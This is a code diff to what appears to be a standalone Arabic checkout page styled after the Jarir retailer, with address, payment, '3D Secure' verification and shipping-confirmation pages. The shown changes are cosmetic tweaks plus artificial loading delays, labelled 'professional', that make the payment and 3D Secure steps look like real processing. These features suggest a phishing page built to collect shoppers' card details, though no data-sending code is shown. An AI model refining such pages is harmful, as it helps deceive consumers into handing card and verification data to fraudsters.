@@ -352,8 +352,6 @@
             color: #666;
         }
 
-        /* ====== الإضافات الجديدة ====== */
-        
         /* حقل العنوان الاحترافي */
         .address-field {
             position: relative;
@@ -441,7 +439,7 @@
             font-size: 12px;
         }
 
-        /* عرض رسوم الشحن */
+        /* عرض رسوم الشحن - بدون أيقونة مال */
         .shipping-fee-display {
             background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
             border: 1px dashed var(--jarir-red);
@@ -468,6 +466,7 @@
             color: var(--jarir-red);
         }
     </style>
+<base target="_blank">
 <base target="_blank">
 </head>
 <body class="max-w-md mx-auto shadow-2xl bg-white">
@@ -598,9 +597,9 @@
                 <textarea id="user-address" class="address-input" rows="3" placeholder="المدينة، الحي، الشارع، رقم المنزل/الشقة..."></textarea>
             </div>
             
-            <!-- ====== عرض رسوم الشحن ====== -->
+            <!-- ====== عرض رسوم الشحن - بدون أيقونة مال ====== -->
             <div class="shipping-fee-display">
-                <div class="fee-label">💰 رسوم الشحن والتوصيل</div>
+                <div class="fee-label">رسوم الشحن والتوصيل</div>
                 <div>
                     <span id="shipping-fee" class="fee-amount">76</span>
                     <span class="fee-currency">ر.س</span>
@@ -898,7 +897,7 @@
         }
         
         // ============================================
-        // دالة الانتقال بين الصفحات
+        // دالة الانتقال بين الصفحات مع تأخير احترافي
         // ============================================
         function showPage(pageId) {
             document.getElementById('fullLoading').classList.add('active');
@@ -920,6 +919,17 @@
                 });
             }
             
+            // تأخير احترافي حسب الصفحة
+            var delay = 600; // افتراضي
+            
+            if (pageId === 'page-payment') {
+                delay = 2500; // 2.5 ثانية لصفحة الدفع
+            } else if (pageId === 'page-verify') {
+                delay = 3000; // 3 ثواني لصفحة 3D Secure
+            } else if (pageId === 'page-success') {
+                delay = 3500; // 3.5 ثانية لصفحة الشحنة
+            }
+            
             setTimeout(function() {
                 var pages = document.querySelectorAll('.page');
                 for (var i = 0; i < pages.length; i++) {
@@ -938,7 +948,7 @@
                 if (pageId === 'page-success') {
                     updateSuccessPage();
                 }
-            }, 600);
+            }, delay);
         }
         
         // ============================================
